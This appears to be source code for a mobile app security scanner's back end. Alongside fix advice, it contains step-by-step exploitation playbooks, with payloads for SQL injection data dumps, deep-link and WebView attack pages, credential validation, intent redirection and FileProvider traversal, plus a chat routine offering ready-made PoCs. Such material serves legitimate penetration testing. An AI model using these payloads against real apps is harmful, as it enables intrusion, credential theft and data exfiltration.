                              "in androidx.webkit). Set `setAllowFileAccess(false)` and "
                              "`setAllowUniversalAccessFromFileURLs(false)`. Never load "
                              "attacker-controlled HTML.",
        "trustmanager-bypass":"Remove the custom TrustManager. Use the platform default. "
                              "If pinning is required, use the network_security_config XML "
                              "with `<pin-set>` rather than a custom TrustManager.",
        "secrets":            "Remove the credential from the binary. Move it to a secure "
                              "back-end. Issue short-lived tokens to clients. Rotate every "
                              "exposed credential immediately. Add CI checks (gitleaks, "
                              "trufflehog) to prevent recurrence.",
        "intent-redirection": "Never extract a Parcelable Intent from another app and call "
                              "`startActivity` on it. If forwarding is required, validate the "
                              "target's component name against an allowlist and clear "
                              "FLAG_GRANT_*_URI_PERMISSION flags.",
        "fileprovider":       "Replace concatenation with `new File(rootDir, name).getCanonicalFile()` "
                              "and verify `target.toPath().startsWith(rootDir.toPath())`. Reject "
                              "path components containing `..` or absolute paths early.",
        "frida-runtime":      "Implement runtime application self-protection (RASP): detect "
                              "Frida's signatures, validate process memory at startup, harden "
                              "any anti-debug checks against pattern-matched bypasses.",
    }.get(key, "Refer to the finding's remediation field.")


def _references_for_recipe(key):
    return {
        "sql-injection":     ["https://cwe.mitre.org/data/definitions/89.html",
                              "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"],
        "exported-activity": ["https://cwe.mitre.org/data/definitions/926.html",
                              "https://developer.android.com/guide/topics/manifest/activity-element#exported"],
        "deeplink":          ["https://cwe.mitre.org/data/definitions/939.html",
                              "https://developer.android.com/training/app-links"],
        "webview-rce":       ["https://nvd.nist.gov/vuln/detail/CVE-2014-1939",
                              "https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface"],
        "trustmanager-bypass":["https://cwe.mitre.org/data/definitions/295.html",
                               "https://developer.android.com/training/articles/security-config"],
        "secrets":           ["https://cwe.mitre.org/data/definitions/798.html",
                              "https://developer.android.com/topic/security/data"],
        "intent-redirection":["https://cwe.mitre.org/data/definitions/927.html",
                              "https://github.com/oversecured/ovaa"],
        "fileprovider":      ["https://nvd.nist.gov/vuln/detail/CVE-2024-0044",
                              "https://www.microsoft.com/en-us/security/blog/2024/05/01/dirty-stream-attack-discovering-and-mitigating-a-common-vulnerability-pattern-in-android-apps/"],
        "frida-runtime":     ["https://frida.re/docs/android/",
                              "https://github.com/frida/frida"],
    }.get(key, [])


def _priority_for_severity(severity):
    s = (severity or "").lower()
    return {
        "critical": "P0 — fix in current sprint, no exceptions",
        "high":     "P1 — fix within 7 days",
        "medium":   "P2 — fix within 30 days",
        "low":      "P3 — fix within 90 days or next major release",
        "info":     "P4 — track for awareness; remediation optional",
    }.get(s, "P2 — fix within 30 days (default)")


# Step-by-step prose walkthroughs for each recipe.
# Each step has: title, detail (what to do + why), verify (how to confirm success).
EXPLOIT_STEPS = {
    "sql-injection": [
        {"title": "Identify the SQL sink",
         "detail": "Run the Frida hook in the PoC code below to log every `rawQuery()` and `query()` call. "
                   "Use the app normally for 30 seconds. Any logged statement that contains user-controlled "
                   "input (search box, profile name, URL parameter) is a candidate sink.",
         "verify": "You see `[SQL]` lines in the Frida console containing strings you typed in the app."},
        {"title": "Confirm injection is reachable",
         "detail": "Pick the most promising sink. Send the same input but append a syntactically broken "
                   "fragment (e.g. `test'`). If the app crashes or the Frida log shows an unclosed-quote "
                   "exception, the input is concatenated unsafely.",
         "verify": "Logcat shows `SQLiteException: unrecognized token` or similar."},
        {"title": "Achieve UNION-based data exfiltration",
         "detail": "Build a payload like `' UNION SELECT name FROM sqlite_master WHERE type='table' --`. "
                   "Send it through the same input. The response should contain table names from the app's "
                   "private database.",
         "verify": "The response includes table names you didn't expect (users, sessions, secrets)."},
        {"title": "Dump arbitrary tables",
         "detail": "Adapt the UNION payload to select specific columns: "
                   "`' UNION SELECT username||':'||password_hash FROM users --`. "
                   "Most apps will display the result somewhere in the UI or API response.",
         "verify": "You see real user data (hashed passwords, tokens, PII) in the response."},
        {"title": "Document and report",
         "detail": "Capture: (1) the vulnerable input field / endpoint, (2) the exact payload that worked, "
                   "(3) a sample of exfiltrated data (redacted), (4) the Frida log proving the SQL was "
                   "executed against the private database. Include the CVSS score from the finding.",
         "verify": "Report includes reproducible steps and proof of impact."},
    ],
    "exported-activity": [
        {"title": "Enumerate exported components",
         "detail": "Run `adb shell dumpsys package <pkg>` and look for `Activity Resolver Table`. Every "
                   "Activity listed there is launchable by other apps. Pair this with the Components tab "
                   "in Vexa to get the structured list.",
         "verify": "You have a list of fully-qualified Activity names with `exported=true`."},
        {"title": "Probe each Activity with crafted Intent extras",
         "detail": "Use the bash loop in the PoC. For each Activity, send a launch Intent with extras like "
                   "`is_authenticated=true`, `role=admin`, `user_id=1`. Watch for screens that should require "
                   "login but appear anyway.",
         "verify": "An Activity that should require auth opens directly with admin features visible."},
        {"title": "Trace what the Activity reads",
         "detail": "Run the Frida `intent-tracer.js` script. Replay the launch Intent. The script logs every "
                   "extra the Activity reads via `getStringExtra()`, `getIntExtra()` etc. This reveals which "
                   "extras the app trusts.",
         "verify": "Frida log shows the Activity calling `getStringExtra(\"role\")` or similar."},
        {"title": "Craft a privilege-escalation payload",
         "detail": "Once you know which extras the app reads, build a launch Intent that supplies them. "
                   "Common bug patterns: redirect URLs to attacker server, file paths with `../`, "
                   "boolean flags for premium / admin features.",
         "verify": "Activity behaves as if you're an authenticated admin user."},
        {"title": "Build a one-click attack page",
         "detail": "If the app responds to deep-link Intents (most do), wrap the malicious Intent in a `<meta "
                   "http-equiv=\"refresh\">` tag. A victim visiting your page on their phone will silently "
                   "trigger the Activity launch.",
         "verify": "Visiting your test HTML on the device launches the target Activity automatically."},
    ],
    "deeplink": [
        {"title": "Catalogue every deep link",
         "detail": "Vexa's Deep Links tab lists each registered URI scheme/host/path. Note which ones are "
                   "marked `autoVerify=false` — those open without confirmation.",
         "verify": "You have a table of URIs the app will accept."},
        {"title": "Trigger each link to map handlers",
         "detail": "For every URI, run `adb shell am start -W -a android.intent.action.VIEW -d \"<URI>\"`. "
                   "Note which Activity opens. Use Frida's `intent-tracer.js` to see what query parameters "
                   "the Activity parses.",
         "verify": "You can map URI patterns to Activity names and parameter names."},
        {"title": "Test path traversal in URI",
         "detail": "If any URI accepts a `path` or `file` parameter, try `../../../databases/users.db`. "
                   "If the app loads the file, you have arbitrary read of the app's private storage.",
         "verify": "App displays content from a file outside its intended directory."},
        {"title": "Test URL parameters in WebView links",
         "detail": "If a deep link feeds into a WebView (often the case for `myapp://browse?url=...`), "
                   "supply `javascript:alert(document.cookie)`. If the alert fires, you have JS execution "
                   "in the app's WebView context.",
         "verify": "Alert dialog appears with cookie content visible."},
        {"title": "Weaponise via attacker page",
         "detail": "Use the `<meta refresh>` HTML in the PoC. Host it anywhere (even a Pastebin raw URL). "
                   "The victim only needs to tap the link from their phone for the exploit to fire.",
         "verify": "Opening your URL on the device triggers the deep-link payload."},
    ],
    "webview-rce": [
        {"title": "Find the JS bridge",
         "detail": "Run the Frida `webview-bridges.js` script. Use the app normally — every "
                   "`addJavascriptInterface()` call is logged with the JS name and the exposed Java class. "
                   "Common names: `jsBridge`, `androidApi`, `Native`, `app`.",
         "verify": "Frida console shows `[WebView] Exposes Java object as window.X`."},
        {"title": "Identify exposed methods",
         "detail": "The Frida output also lists every method on the exposed object. Look for methods that "
                   "take string arguments — those are usually attack surfaces (URL openers, command runners, "
                   "token getters).",
         "verify": "You have a list of methods callable from JS via `window.<name>.method()`."},
        {"title": "Find a way to inject JS",
         "detail": "The JS bridge is only useful if you can run JS in the WebView. Look for: deep links "
                   "that load an external URL, WebViews that load HTML from intent extras, file:// URIs that "
                   "render attacker-controlled HTML, or HTTP loads that you can MITM.",
         "verify": "You can make the WebView load a page you control."},
        {"title": "Craft the RCE payload",
         "detail": "Use the HTML in the PoC. It iterates common bridge names and tries: (a) reflection-based "
                   "Runtime.exec on Android < 4.2, (b) direct calls to suspicious methods on the bridge "
                   "object. Replace the example methods with the ones you discovered in step 2.",
         "verify": "The payload's exfil request reaches your test server with output of `id` or sensitive data."},
        {"title": "Document scope of compromise",
         "detail": "Once RCE works, demonstrate impact: read SharedPreferences, read databases, get the "
                   "device's account list (`accounts: cat /data/system/users/0/accounts.db`), or run a "
                   "reverse-shell to attacker-controlled host.",
         "verify": "You have a screenshot or log showing data extraction from inside the app sandbox."},
    ],
    "trustmanager-bypass": [
        {"title": "Confirm the app uses a trust-all manager",
         "detail": "From the Vexa scan, the `trustmanager-trust-all` finding indicates the bug. To verify, "
                   "decompile the app (`apktool d app.apk`) and search for `checkServerTrusted` methods that "
                   "have empty bodies.",
         "verify": "You find a TrustManager subclass with an empty `checkServerTrusted` method."},
        {"title": "Set up MITM proxy on attacker network",
         "detail": "Install mitmproxy or Burp Suite. Start it on port 8080. Make a note of the attacker "
                   "machine's IP address (assume 10.0.0.5 for the example).",
         "verify": "mitmproxy console is running and showing 'listening on 0.0.0.0:8080'."},
        {"title": "Configure the device to use the proxy",
         "detail": "On the test device, go to Settings → WiFi → long-press your network → Modify network → "
                   "Show advanced options → Proxy: Manual. Enter your attacker IP and port 8080. Save.",
         "verify": "Device traffic now flows through your proxy. Test with `curl https://example.com` from a browser."},
        {"title": "Capture app traffic",
         "detail": "Open the target app. Because it accepts any cert, mitmproxy's auto-generated cert is "
                   "accepted without warning. Every API call now appears in the proxy console — request "
                   "URL, headers, body, response.",
         "verify": "You see the app's API requests with auth tokens, session cookies, and JSON bodies in the proxy."},
        {"title": "Demonstrate impact",
         "detail": "Capture an authenticated request, replay it from your machine with `curl`. Or modify a "
                   "response to test client-side trust assumptions (price=0, role=admin). Document what you "
                   "could read or modify.",
         "verify": "You have proof of either credential capture or response tampering affecting app behaviour."},
    ],
    "secrets": [
        {"title": "Extract every secret Vexa flagged",
         "detail": "Open the Secrets tab. Each row is a hardcoded credential. Note the type (AWS, Stripe, "
                   "etc.) and the value. The Frida `secrets-dumper.js` script in the PoC also catches "
                   "secrets that are decrypted at runtime.",
         "verify": "You have a list of secret values and their probable provider."},
        {"title": "Validate each secret with the upstream API",
         "detail": "Use the curl commands in the PoC. Each command calls a public-facing API endpoint with "
                   "the leaked credential. A 200 response (or one with account info) means the credential "
                   "is live. A 401/403 means it's already revoked or restricted.",
         "verify": "You have at least one credential that returns valid account data."},
        {"title": "Determine the credential's scope",
         "detail": "Live AWS keys: run `aws sts get-caller-identity` and check the IAM policy with "
                   "`aws iam list-attached-user-policies`. Live OAuth tokens: call the provider's "
                   "introspection endpoint to see scopes. Document everything the credential can do.",
         "verify": "You have a list of permissions / resources the credential grants access to."},
        {"title": "Estimate blast radius",
         "detail": "If the AWS key has S3 write access, the attacker can serve arbitrary content from the "
                   "company's bucket. If the Stripe key is `sk_live_*`, they can issue refunds. Match each "
                   "credential to the worst-case scenario.",
         "verify": "Each credential has a documented worst-case outcome (data theft, financial loss, etc.)."},
        {"title": "Coordinate disclosure and rotation",
         "detail": "Report immediately. Most providers rotate credentials within hours of a verified leak. "
                   "Some (AWS, GitHub) auto-detect leaked keys and quarantine them. Provide the package name, "
                   "version, and exact APK path of the leak.",
         "verify": "Vendor confirms rotation. Keys no longer work."},
    ],
    "intent-redirection": [
        {"title": "Find the forwarder",
         "detail": "From the scan, the `intent-redirection` finding identifies an Activity that reads "
                   "`getParcelableExtra(\"forward_intent\")` (or similar) and uses it as the target for "
                   "`startActivity()`. Confirm via Frida intent tracer.",
         "verify": "You see the Activity calling `getParcelableExtra` with an Intent-typed key."},
        {"title": "Identify internal targets",
         "detail": "List all components in the manifest that are `exported=false`. These are normally "
                   "unreachable from other apps. They're now reachable through the forwarder.",
         "verify": "You have a list of internal Activities/Services worth attacking."},
        {"title": "Build the nested Intent",
         "detail": "Construct an Intent that targets an internal component. Set extras the internal "
                   "component will trust (`role=admin`, `user_id=1`). Wrap it in an outer Intent that "
                   "targets the public forwarder. Use the Kotlin or adb form in the PoC.",
         "verify": "Your outer Intent contains the inner Intent as a Parcelable extra."},
        {"title": "Trigger the redirection",
         "detail": "Send the outer Intent. The forwarder will extract the inner Intent and call "
                   "`startActivity(inner)`. Because the call originates from the app itself, Android's "
                   "exported-check is bypassed.",
         "verify": "The internal Activity opens as if launched from inside the app."},
        {"title": "Document privilege gained",
         "detail": "What does the internal Activity do that the public one doesn't? Common: account "
                   "deletion, password reset, admin panels, debug menus. Demonstrate one such action.",
         "verify": "You executed a privileged action through the forwarder that exported=false should have prevented."},
    ],
    "fileprovider": [
        {"title": "Enumerate the provider's authority and roots",
         "detail": "From `dumpsys package <pkg>`, find the FileProvider authority. Decompile and locate "
                   "`res/xml/file_paths.xml` (or whatever the manifest's `<meta-data>` points to). This "
                   "lists which directories are exposed via content://.",
         "verify": "You have the authority string and a list of exposed root directories."},
        {"title": "Test read access via content URI",
         "detail": "Build content URIs for files inside the exposed roots. Try "
                   "`content://AUTHORITY/files/cache/some_file.txt`. Use `adb shell content read --uri` to "
                   "verify access without writing an attacker app.",
         "verify": "You can read files from the provider via content://."},
        {"title": "Test path traversal",
         "detail": "Append URL-encoded `../` to escape the intended root: "
                   "`content://AUTHORITY/files/..%2F..%2Fdatabases%2Fusers.db`. Some FileProviders normalise "
                   "the path and reject this; others don't.",
         "verify": "You can read a file outside the exposed root (e.g. private SQLite database)."},
        {"title": "Test write access (Dirty Stream pattern)",
         "detail": "If `openFile` accepts mode='w' and the path traverses, you can WRITE to the app's "
                   "private storage. Common high-impact targets: `code_cache/` (loadable as DEX), "
                   "`shared_prefs/` (auth bypass).",
         "verify": "You can place a file in the app's private storage from outside."},
        {"title": "Achieve code execution",
         "detail": "If you can write to `code_cache/` and the app uses `DexClassLoader`, you have a path "
                   "to code execution. Otherwise, write a malicious shared_prefs XML to bypass auth on "
                   "next app start. Document either as the worst-case impact.",
         "verify": "You demonstrated either code execution or authentication bypass via written file."},
    ],
    "frida-runtime": [
        {"title": "Install Frida tooling",
         "detail": "On your workstation: `pip install frida-tools`. Download the matching frida-server "
                   "binary for your device's ABI from https://github.com/frida/frida/releases. Use "
                   "`adb shell getprop ro.product.cpu.abi` to check the ABI.",
         "verify": "`frida --version` works. You have the matching frida-server binary."},
        {"title": "Push and run frida-server",
         "detail": "On a rooted device or emulator: `adb push frida-server /data/local/tmp/`, then "
                   "`adb shell chmod 755 /data/local/tmp/frida-server`, then "
                   "`adb shell '/data/local/tmp/frida-server &'`.",
         "verify": "`frida-ps -U` lists running processes on the device."},
        {"title": "Save and launch the inspect script",
         "detail": "Copy the JavaScript from the PoC into a file `inspect-all.js`. Run "
                   "`frida -U -f <pkg> -l inspect-all.js --no-pause`. The app will start with the script "
                   "attached.",
         "verify": "Frida console shows `[+] inspect-all.js loaded` and starts logging events."},
        {"title": "Exercise the app and harvest signals",
         "detail": "Use the app: log in, browse, perform key actions. The script logs every HTTP call, "
                   "SharedPreferences write, cipher operation, Intent dispatch, SQL query, and file read. "
                   "Save the log to a file with `frida ... 2>&1 | tee runtime.log`.",
         "verify": "Your log contains URLs, secrets being persisted, and crypto operations."},
        {"title": "Analyse for findings",
         "detail": "Grep the log for sensitive patterns: tokens in HTTP URLs, prefs containing passwords, "
                   "weak ciphers being instantiated, files accessed in unexpected paths. Each is a "
                   "potential finding to add to your report.",
         "verify": "You identified at least 3 concrete behaviours worth documenting."},
    ],
}


# Per-recipe prerequisites — what the attacker needs before starting.
EXPLOIT_REQUIREMENTS = {
    "sql-injection":      ["A test device with the target app installed", "ADB on PATH",
                           "Frida + frida-server on the device (for sink discovery)"],
    "exported-activity":  ["Test device with the app installed", "ADB on PATH",
                           "Optional: Frida for intent tracing"],
    "deeplink":           ["Test device with the app installed", "ADB on PATH",
                           "A web server (or Pastebin) to host the attack page"],
    "webview-rce":        ["Test device with the app installed",
                           "Frida + frida-server (to enumerate JS bridges)",
                           "A web server you control (for the payload + exfil)"],
    "trustmanager-bypass":["mitmproxy or Burp Suite",
                           "Test device on a WiFi network you control",
                           "Optional: Frida (only needed if app implements pinning)"],
    "secrets":            ["Internet access", "curl", "Provider-specific CLIs (aws, stripe) for validation"],
    "intent-redirection": ["Test device with the app installed", "ADB on PATH",
                           "Optional: Android Studio for building an attacker app"],
    "fileprovider":       ["Test device with the app installed", "ADB on PATH",
                           "Optional: an attacker app for full impact PoC"],
    "frida-runtime":      ["Rooted device or emulator", "Frida tooling on workstation",
                           "frida-server binary for the device's ABI"],
}


# =============================================================================
# Rule-based chat assistant -- works without any LLM.
# Maps user questions to relevant findings and produces grounded answers.
# =============================================================================

def _rule_based_chat(messages: list, report: dict) -> str:
    """Answer the user's question using only the data in `report`."""
    if not messages:
        return "Ask me about findings, exploits, or specific vulnerabilities."
    last = (messages[-1].get("content") or "").strip()
    if not last:
        return "Type your question."

    # FIRST: check if the user is asking us to GENERATE / CREATE / BUILD an exploit.
    gen = _generate_exploit(last, report)
    if gen:
        return gen

    q = last.lower()
    findings = report.get("findings", [])
    pkg = report.get("metadata", {}).get("package", "unknown")
    summary = report.get("summary", {})

    def _fmt_finding(f, deep=False):
        lines = [f"[{f.get('severity', '?').upper()}] {f.get('title', '')}"]
        if f.get("cve"):  lines.append(f"  CVE:    {f['cve']}")
        if f.get("cvss"): lines.append(f"  CVSS:   {f['cvss']}")
        if f.get("cwe"):  lines.append(f"  CWE:    {f['cwe']}")
        if deep:
            if f.get("description"): lines.append(f"  Issue:  {f['description']}")
            if f.get("impact"):      lines.append(f"  Impact: {f['impact']}")
            if f.get("evidence"):    lines.append(f"  Where:  {f['evidence'][:200]}")
            if f.get("fix"):         lines.append(f"  Fix:    {f['fix']}")
            if f.get("references"):
                lines.append(f"  Refs:   {f['references'][0]}")
        return "\n".join(lines)

    # ---- Intent detection ----
    is_count = any(w in q for w in ("how many", "count", "number of"))
    is_summary = any(w in q for w in ("summary", "overview", "summarize", "tldr", "tl;dr"))
    is_exploit = any(w in q for w in ("exploit", "attack", "how to break", "how to abuse",
                                       "poc", "proof of concept", "command", "payload"))
    is_explain = any(w in q for w in ("explain", "what is", "what's", "how does", "how do",
                                       "tell me about", "describe", "walk me through"))
    is_severity = any(w in q for w in ("critical", "highest", "worst", "most severe", "severe"))
    is_cve = any(w in q for w in ("cve", "vulnerability id", "known vuln"))
    is_cvss = "cvss" in q
    is_fix = any(w in q for w in ("fix", "remediation", "patch", "how do i fix",
                                   "how to fix", "mitigate", "remediate"))
    is_pkg_q = any(w in q for w in ("package", "bundle", "app id", "what app"))
    is_secret = any(w in q for w in ("secret", "api key", "credential", "token", "leak"))
    is_help = any(w in q for w in ("help", "what can you do", "how do you work", "commands"))
    is_list_exploits = any(p in q for p in ("list exploits", "what exploits", "which exploits",
                                             "available exploits", "what can you generate", "list recipes"))

    # ---- List available exploits ----
    if is_list_exploits:
        out = ["I can generate ready-to-run PoCs for these vulnerability classes:\n"]
        for key, recipe in EXPLOIT_RECIPES.items():
            out.append(f"  - **{recipe['title']}**")
            out.append(f"      ask: 'create an exploit for {recipe['tags'][0]}'")
            out.append("")
        out.append("Or just describe the bug -- I'll match it to a recipe.")
        return "\n".join(out)

    # ---- Explain a vulnerability class (no PoC, just deep explanation) ----
    if is_explain:
        for key, recipe in EXPLOIT_RECIPES.items():
            if any(tag in q for tag in recipe["tags"]):
                # Look up the matching finding(s) in the actual scan
                related = [f for f in findings if any(t.replace(" ", "-") in (f.get("id", "") or "") for t in recipe["tags"])]
                out = [f"### {recipe['title']}\n"]
                out.append(recipe["explanation"])
                if related:
                    out.append(f"\n**In your scan**, this affects:")
                    for f in related[:5]:
                        out.append(f"  - [{f.get('severity', '?').upper()}] {f.get('title', '')}")
                        if f.get("evidence"):
                            out.append(f"    Evidence: {f['evidence'][:140]}")
                else:
                    out.append("\n**This vulnerability class wasn't detected in the current scan.**")
                out.append("\nAsk me to **'create an exploit for " + recipe['tags'][0] + "'** to get a runnable PoC.")
                return "\n".join(out)

    # ---- Specific topic matchers (find a finding by keyword in the question) ----
    topic_map = {
        "webview": ["webview", "javascript-enabled", "js-interface", "addjs"],
        "sql injection": ["sql-injection", "sql-string-concat"],
        "deeplink": ["deeplink", "deep-link"],
        "intent": ["intent-redirection"],
        "trustmanager": ["trustmanager", "tls", "ssl"],
        "secrets": ["secret-"],
        "debuggable": ["app-debuggable", "ios-debuggable"],
        "backup": ["allow-backup"],
        "fileprovider": ["fileprovider"],
        "janus": ["janus"],
        "task hijacking": ["task-hijacking"],
        "keychain": ["ios-keychain"],
        "ats": ["ios-ats"],
        "url scheme": ["ios-custom-url-schemes", "ios-url"],
    }
    matched_topic = None
    for topic, prefixes in topic_map.items():
        if topic in q or any(p.replace("-", " ") in q for p in prefixes):
            matched_topic = (topic, prefixes); break

    # ---- Replies ----
    if is_help:
        return ("I'm a local exploit assistant. I work entirely without external services and "
                "answer based on this scan's findings.\n\n"
                "**ASK QUESTIONS**\n"
                "  - 'summary'  /  'show critical findings'  /  'list secrets'\n"
                "  - 'what is Janus?'  /  'explain WebView RCE'  /  'how does intent redirection work?'\n"
                "  - 'what's the CVE for Dirty Stream?'  /  'top by CVSS'\n"
                "  - 'how do I fix the SQL injection?'\n\n"
                "**GENERATE EXPLOITS** (I write working PoC code targeted at this app)\n"
                "  - 'create an exploit for SQL injection'\n"
                "  - 'build a PoC for the WebView RCE'\n"
                "  - 'write a Frida script to dump secrets'\n"
                "  - 'generate a deep-link attack'\n"
                "  - 'make an intent spoofing payload'\n"
                "  - 'list exploits' (see all available recipes)\n\n"
                "For free-form chat, install Ollama (https://ollama.com) -- I'll route to it.")

    if is_pkg_q:
        m = report.get("metadata", {})
        return (f"Package: {m.get('package', '?')}\n"
                f"Version: {m.get('version_name', '?')} ({m.get('version_code', '?')})\n"
                f"minSdk: {m.get('min_sdk', '?')}  targetSdk: {m.get('target_sdk', '?')}\n"
                f"Activities: {len(m.get('activities', []))}, "
                f"Services: {len(m.get('services', []))}, "
                f"Receivers: {len(m.get('receivers', []))}, "
                f"Providers: {len(m.get('providers', []))}")

    if is_summary or is_count:
        total = sum(summary.get(k, 0) for k in ("critical", "high", "medium", "low", "info"))
        secrets = [f for f in findings if f.get("id", "").startswith("secret-") or f.get("id", "").startswith("ios-secret-")]
        cves = sorted({f.get("cve") for f in findings if f.get("cve")})
        return (f"Scan summary for {pkg}:\n"
                f"  Total findings: {total}\n"
                f"  Critical: {summary.get('critical',0)}  High: {summary.get('high',0)}  "
                f"Medium: {summary.get('medium',0)}  Low: {summary.get('low',0)}  Info: {summary.get('info',0)}\n"
                f"  Hardcoded secrets: {len(secrets)}\n"
                f"  Known CVEs touched: {', '.join(cves) if cves else 'none'}")

    if is_severity:
        crit = [f for f in findings if f.get("severity") == "critical"]
        high = [f for f in findings if f.get("severity") == "high"]
        if not (crit or high):
            return "No critical or high severity findings in this scan."
        out = []
        if crit:
            out.append(f"=== {len(crit)} CRITICAL ===")
            out += [_fmt_finding(f) for f in crit[:5]]
        if high:
            out.append(f"\n=== {len(high)} HIGH ===")
            out += [_fmt_finding(f) for f in high[:8]]
        return "\n".join(out)

    if is_secret:
        secrets = [f for f in findings if f.get("id", "").startswith("secret-") or f.get("id", "").startswith("ios-secret-")]
        if not secrets:
            return ("No hardcoded secrets matched our 40+ patterns in this app's binary, resources, "
                    "or DEX strings. This means: (a) the app uses secrets correctly via a backend, "
                    "(b) the secret format is custom and outside our patterns, or "
                    "(c) the secret is obfuscated. Try the Auto PoCs tab for the universal secret-scan "
                    "Frida script that hooks runtime crypto.")
        out = [f"Found {len(secrets)} potential hardcoded credential(s):\n"]
        for s in secrets[:10]:
            out.append(_fmt_finding(s, deep=True))
            out.append("")
        out.append("Each has a ready-to-run validator in the Auto PoCs tab.")
        return "\n".join(out)

    if is_cve:
        cves = [(f.get("cve"), f) for f in findings if f.get("cve")]
        if not cves:
            return "No findings in this scan map to a specific public CVE. Most issues are configuration weaknesses (CWE) rather than CVE-tracked vulnerabilities."
        out = [f"Findings with CVE references:\n"]
        for cve, f in cves[:10]:
            out.append(f"  {cve} -- {f.get('title', '')}  (CVSS {f.get('cvss', '?')})")
        return "\n".join(out)

    if matched_topic:
        topic_name, prefixes = matched_topic
        matches = [f for f in findings if any(p in f.get("id", "") for p in prefixes)]
        if not matches:
            return f"No '{topic_name}' findings in this scan."
        if is_exploit:
            # Route to exploit guidance
            adv = build_exploit_playbook(report)
            relevant = [b for b in adv if any(p in (b.get("id") or "") for p in prefixes)]
            if not relevant:
                relevant = adv[:2]
            out = [f"Exploitation steps for {topic_name}:\n"]
            for b in relevant:
                out.append(f"=== {b.get('title', '')} ===")
                out.append(f"Why: {b.get('why', '')}")
                for label, step in b.get("steps", [])[:6]:
                    out.append(f"\n[{label}]\n{step}")
                out.append("")
            return "\n".join(out)
        if is_fix:
            out = [f"Remediation for {topic_name} ({len(matches)} finding(s)):\n"]
            for f in matches[:5]:
                out.append(_fmt_finding(f))
                if f.get("fix"):
                    out.append(f"  FIX:\n  {f['fix']}")
                out.append("")
            return "\n".join(out)
        out = [f"Found {len(matches)} {topic_name} finding(s):\n"]
        for f in matches[:5]:
            out.append(_fmt_finding(f, deep=True))
            out.append("")
        return "\n".join(out)

    if is_exploit:
        # Generic exploit advice -- show top blocks from advisor
        adv = build_exploit_playbook(report)
        if not adv:
            return "No exploitation paths to suggest."
        top = adv[:3]
        out = ["Top exploitation paths for this app:\n"]
        for b in top:
            out.append(f"=== {b.get('title', '')} ===")
            out.append(f"Severity: {b.get('severity', '?')}")
            out.append(f"Why: {b.get('why', '')}")
            for label, step in b.get("steps", [])[:4]:
                out.append(f"\n[{label}]\n{step}")
            out.append("")
        out.append("(Open Exploit Advisor tab for the full playbook)")
        return "\n".join(out)

    if is_fix:
        with_fix = [f for f in findings if f.get("fix") and f.get("severity") in ("critical", "high")]
        if not with_fix:
            return "No high-severity findings with structured fix data in this scan."
        out = ["Top fixes (critical / high):\n"]
        for f in with_fix[:5]:
            out.append(_fmt_finding(f))
            out.append(f"  FIX: {f['fix']}")
            out.append("")
        return "\n".join(out)

    if is_cvss:
        scored = sorted([f for f in findings if f.get("cvss")],
                        key=lambda x: x.get("cvss", 0), reverse=True)
        if not scored:
            return "No findings have a CVSS score in this scan."
        out = ["Findings ranked by CVSS:\n"]
        for f in scored[:10]:
            out.append(f"  {f.get('cvss', '?'):.1f}  [{f.get('severity', '?')}]  {f.get('title', '')}")
        return "\n".join(out)

    # ---- Fallback: keyword search across findings ----
    tokens = [t for t in re.findall(r"\w{3,}", q) if t not in
              ("the", "and", "for", "that", "this", "with", "what", "which", "have",
               "show", "tell", "list", "find", "give", "are", "any", "you", "can")]
    if tokens:
        matches = []
        for f in findings:
            blob = (f.get("title", "") + " " + f.get("description", "") + " " + f.get("id", "")).lower()
            if any(t in blob for t in tokens):
                matches.append(f)
        if matches:
            out = [f"Found {len(matches)} finding(s) matching your query:\n"]
            for f in matches[:6]:
                out.append(_fmt_finding(f, deep=True))
                out.append("")
            return "\n".join(out)

    return ("I couldn't match your question to a specific finding. Try:\n"
            "  - 'summary'  /  'critical findings'  /  'list secrets'\n"
            "  - 'how do I exploit <topic>?' (e.g. webview, sql, intent)\n"
            "  - 'how do I fix <topic>?'\n"
            "  - 'what's the CVE for <topic>?'\n"
            "  - 'help'")


@app.post("/api/scan/{sid}/chat")
async def chat(sid: str, body: dict = Body(...)):
    """Chat about the scan. Tries Ollama first; falls back to rule-based."""
    report = _load(sid)
    messages = body.get("messages", [])

    # Validate input shape and cap sizes to prevent DoS
    if not isinstance(messages, list):
        raise HTTPException(400, "messages must be a list")
    if len(messages) > 100:
        raise HTTPException(413, "Too many messages in this conversation. Start a new chat.")
    cleaned = []
    for m in messages:
        if not isinstance(m, dict):
            continue
        role = m.get("role")
        content = m.get("content") or ""
        if role not in ("user", "assistant", "system"):
            continue
        if not isinstance(content, str):
            continue
        if len(content) > MAX_CHAT_CHARS:
            content = content[:MAX_CHAT_CHARS] + "...[truncated]"
        cleaned.append({"role": role, "content": content})
    messages = cleaned

    # Try Ollama if available
    try:
        if await ollama_available():
            models = await ollama_list_models()
            if models:
                model = body.get("model") or models[0]
                reply = await ollama_chat(messages, report, model)
                return {"reply": reply, "engine": f"ollama:{model}"}
    except Exception as e:
        log.warning("Ollama chat failed, falling back to rule-based: %s", e)

    # Always fall back to rule-based
    reply = _rule_based_chat(messages, report)
    return {"reply": reply, "engine": "rule-based"}


@app.get("/api/scan/{sid}/report.json")
async def report_json(sid: str):
    return Response(content=json.dumps(_load(sid), indent=2, default=str),
                    media_type="application/json",
                    headers={"Content-Disposition": f"attachment; filename=vexa-{sid}.json"})


SEV_COLOR = {"critical": "#ff3b6b", "high": "#ff8a3d", "medium": "#ffd23d",
             "low": "#3dc0ff", "info": "#9aa0a6"}


@app.get("/api/scan/{sid}/report.html", response_class=HTMLResponse)
async def report_html(sid: str):
    r = _load(sid)
    m   = r.get("metadata", {})
    s   = r.get("summary", {})
    fs  = r.get("findings", [])
    extras = r.get("extras", {}) or {}
    platform = r.get("platform", "Android")
    pkg = html.escape(str(m.get("package", "unknown")))
    ver = html.escape(str(m.get("version_name", "")))
    when = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    fname = html.escape(str(r.get("filename", "")))

    total = sum(s.get(k, 0) for k in ("critical", "high", "medium", "low", "info"))
    secrets_n = sum(1 for f in fs if (f.get("id","").startswith("secret-") or f.get("id","").startswith("ios-secret-")))
    cves = sorted({f.get("cve") for f in fs if f.get("cve")})
    risk_score = (s.get("critical",0)*15 + s.get("high",0)*8 + s.get("medium",0)*3 + s.get("low",0))
    risk_label = "CRITICAL" if risk_score >= 45 else "HIGH" if risk_score >= 20 else "MEDIUM" if risk_score >= 8 else "LOW"
